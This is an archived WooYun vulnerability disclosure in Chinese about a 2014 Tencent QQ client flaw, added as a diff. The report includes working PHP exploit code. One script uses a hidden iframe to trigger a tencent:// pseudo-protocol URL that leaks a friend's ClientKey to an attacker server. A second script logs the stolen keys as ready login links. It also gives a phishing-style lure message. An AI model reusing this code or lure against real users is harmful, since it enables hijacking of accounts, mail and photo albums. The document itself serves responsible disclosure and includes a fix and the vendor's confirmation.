@@ -1,0 +1,234 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		腾讯QQ某控件设计缺陷导致可远程登录任意QQ账号(已证明QQ空间、相册、微博、邮箱可登陆)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		腾讯QQ某控件设计缺陷导致可远程登录任意QQ账号(已证明QQ空间、相册、微博、邮箱可登陆)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猪猪侠">猪猪侠</a> 
+</li><li>提交时间：		2014-03-21 14:10</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-03-21：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-03-24：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-04-03：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-04-13：	细节向普通白帽子公开<br/>
+									2014-04-23：	细节向实习白帽子公开<br/>
+									2014-05-05：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">腾讯QQ客户端某默认安装空间存在严重安全缺陷，黑客可远程获取任意好友的ClientKEY；<br />
+结合另外一个漏洞，即可绕过腾讯单点登陆系统的IP访问限制，登陆好友的QQ空间(围观QQ相册你懂的！)、QQ邮箱、QQ微博等QQ全线业务系统。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code>#详细的过程视频演示（更易懂）<br />
+http://wydrops-wordpress.stor.sinaapp.com/uploads/2014/05/qq.wmv</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+#1 测试环境<br />
+<br />
+操作系统：Windows8 X64 最新版本补丁<br />
+<br />
+QQ客户端：http://im.qq.com 下载的最新版 V 5.2 客户端程序 (2014年3月21日)<br />
+<br />
+</p><p class="detail"><a href="../images/211350118dcb3fc8983d402e4e1925910a68b362.png" target="_blank"><img src="../images/211350118dcb3fc8983d402e4e1925910a68b362.png" alt="install.png" width="600"/></a></p><p class="detail"><br />
+<br />
+#2 问题描述<br />
+<br />
+腾讯QQ客户端在安装时，会自动启用并在操作系统内注册多个自身产品控件，同时注册伪协议tencent:// 供自身产品调用。<br />
+<br />
+#3 问题细节<br />
+<br />
+腾讯QQ聊天窗口客户端有一个音乐分享功能，可供用户与用户之间进行音乐分享，由于本功能采用伪协议调用miniplayer(QQ空间音乐播放器)中的某个功能来播放音乐，其中mdlurl参数URL未做安全校验，导致直接将客户端的ClientKey附加为参数提交。<br />
+<br />
+我们只需要构造特定的mdlurl，制定到自己的服务器，就能成功截取到好友的ClientKEY了<br />
+<br />
+friend.php<br />
+<br />
+</p><pre><code>&lt;?php<br />
+$uinqq = $_GET[&#039;qq&#039;];<br />
+$request_url = &quot;tencent://miniplayer/?cmd=3&amp;fuin=0&amp;frienduin=&quot; . $uinqq . &quot;&amp;action=&#039;accept&#039;&amp;mdlurl=&#039;http://bbs.m.qq.com/libs/qqmusic.php?songcount=1&amp;songidlist=0&amp;version=207&amp;cmd=3&amp;songnamelist=fuzz&amp;singernamelist=success&amp;songurllist=http%3A%2F%2Fstreamrdt.music.qq.com%2F4887.e3a65320e960cdf1b15d303b11495222%2F0%2Fa.mp3&#039;&amp;Exe=QQ&quot;;<br />
+$qzone_url = &quot;http://user.qzone.qq.com/?&quot; . $uinqq;<br />
+echo &#039;&lt;html&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;2;url=&#039; . $qzone_url . &#039;&quot;&gt;&#039;;<br />
+echo &quot;&lt;iframe src=\&quot;&quot; . $request_url . &quot;\&quot; height=0px width=0px&gt;&lt;/iframe&gt;&lt;/html&gt;&quot;;<br />
+?&gt;</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">#4 实战利用<br />
+<br />
+</p><pre><code>腾讯手机客户端推广计划，帮助好友加速升级！<br />
+http://bbs.m.qq.com/friend.php?qq=63200<br />
+!这个漏洞不受域名或者地域的限制，可以在任意页面引用带有伪协议的链接，就能获取到好友QQ的ClinetKEY<br />
+http://www.wooyun.org/hello?qq=63200<br />
+<br />
+帮忙点一下呗？</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/21140140dbcfebdbf041fc5c5d73deac70b4946f.jpg" target="_blank"><img src="../images/21140140dbcfebdbf041fc5c5d73deac70b4946f.jpg" alt="send.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+#5 好友互动<br />
+<br />
+当QQ好友点击那个链接后，我们即可接收到他的ClientKEY<br />
+<br />
+</p><p class="detail"><a href="../images/211405104aa4bd5c9c4ae666836c17d91f415e00.jpg" target="_blank"><img src="../images/211405104aa4bd5c9c4ae666836c17d91f415e00.jpg" alt=".jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+#6 成功获取到ClientKEY<br />
+<br />
+qqmusic.php<br />
+<br />
+</p><pre><code>&lt;?php<br />
+$qquin = $_GET[&#039;uin&#039;];<br />
+$clientkey = $_GET[&#039;key&#039;];<br />
+$raw_data = &#039;UIN: &#039; . $qquin . &#039;  KEY:  &lt;a href=&quot;http://clubclient.qq.com/clubclient_goto.php?uin=&#039; . $qquin . &#039;&amp;key=&#039; . $clientkey . &#039;&amp;sendclick=1&amp;qptag=1&amp;statid=10001903&amp;gotourl=http://qzone.qq.com&amp;tipsid=52684&quot; target=&quot;_blank&quot;&gt;&#039; . $clientkey . &#039;&lt;/a&gt; &#039; . date(&#039;Y,m,d H:i:s&#039;). &#039;  :  &#039; . $_SERVER[&quot;REMOTE_ADDR&quot;] . &quot;&lt;br&gt;&quot;;<br />
+<br />
+$fp = @fopen(&#039;../fuzzlog.html&#039;,&#039;a+&#039;);<br />
+@fwrite($fp, &quot;$raw_data&quot;);<br />
+@fclose($fp);  <br />
+<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/21140725fdb7c9eef2ec48aebe223159664ad2c7.jpg" target="_blank"><img src="../images/21140725fdb7c9eef2ec48aebe223159664ad2c7.jpg" alt="fuzz.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+# QQ相册，QQ空间，呵呵<br />
+<br />
+</p><p class="detail"><a href="../images/21141006c106fac8df563c639eed6b8b4fc2c894.jpg" target="_blank"><img src="../images/21141006c106fac8df563c639eed6b8b4fc2c894.jpg" alt="qq相册.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"># 严格校验传递ClientKEY的URL是否为自身服务器 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猪猪侠" title="猪猪侠">猪猪侠</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-054204" title="腾讯QQ某控件设计缺陷导致可远程登录任意QQ账号(已证明QQ空间、相册、微博、邮箱可登陆)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2014-03-24 11:14</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="54204";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
